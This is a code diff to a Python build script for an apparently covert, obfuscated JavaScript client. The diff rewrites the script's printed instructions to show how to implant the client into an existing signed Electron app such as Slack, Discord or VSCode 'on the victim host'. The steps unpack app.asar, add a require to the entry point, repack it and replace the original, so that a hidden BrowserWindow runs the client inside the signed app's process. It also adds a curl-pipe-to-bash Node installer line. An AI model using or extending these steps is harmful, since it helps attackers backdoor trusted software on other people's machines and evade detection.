@@ -1,6 +1,10 @@
 import argparse
-
+import sys
 from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parent))
+import its
+
 from jinja2 import Environment, FileSystemLoader, select_autoescape
 
 USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
@@ -67,19 +71,34 @@ def build(args):
         print(f"[+] Wrote Electron renderer to '{renderer_path}'")
 
         print()
-        print("Next: set up and run the Electron app:")
-        print("    npm init -y")
-        print("    npm install --save-dev electron")
-        print("    # then edit package.json and set:  \"main\": \"main.js\"")
-        print("    npx electron .")
+        print("Next: inject into an existing signed Electron app (Slack, Discord,")
+        print("VSCode, or any target you can drop files into on the victim host).")
         print()
-        print(f"main.js opens a hidden BrowserWindow that loads renderer.html,")
-        print(f"which pulls in {out_path.name} via <script src>. Traffic routes through")
-        print("Chromium so OS-level and PAC proxies apply automatically.")
+        print("    npx asar extract path/to/app.asar unpacked/")
+        print("    # open unpacked/package.json and note the \"main\" field --")
+        print("    # that's the app's entry point (e.g. main.js, index.js, dist/main.js)")
+        print(f"    cp {out_path.name} main.js renderer.html unpacked/")
+        print("    # edit the entry point to add:  require('./main.js')")
+        print("    npx asar pack unpacked/ app.asar")
+        print("    # replace the target's app.asar with this one")
+        print()
+        print("The injected main.js opens a hidden BrowserWindow that loads")
+        print(f"renderer.html, which pulls in {out_path.name} via <script src>. Traffic")
+        print("routes through Chromium so OS-level and PAC proxies apply automatically,")
+        print("and the client runs inside the signed app's process.")
     else:
         print()
-        print("Next: bundle and obfuscate into a single .js:")
-        print("    npx webpack --config webpack.conf.js")
+        print("Next: bundle and obfuscate into a single .js.")
+        if its.windows:
+            print()
+            print("    # install Node.js from https://nodejs.org/en/download if needed, then:")
+            print("    npx webpack --config webpack.conf.js")
+        else:
+            print()
+            print("    # install nvm + Node if needed:")
+            print("    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash")
+            print("    . \"$HOME/.nvm/nvm.sh\" && nvm install --lts")
+            print("    npx webpack --config webpack.conf.js")
         print()
         print("The included webpack.conf.js has devtool:false (no source maps) and")
         print("webpack-obfuscator enabled. Output: client.obf.js.")
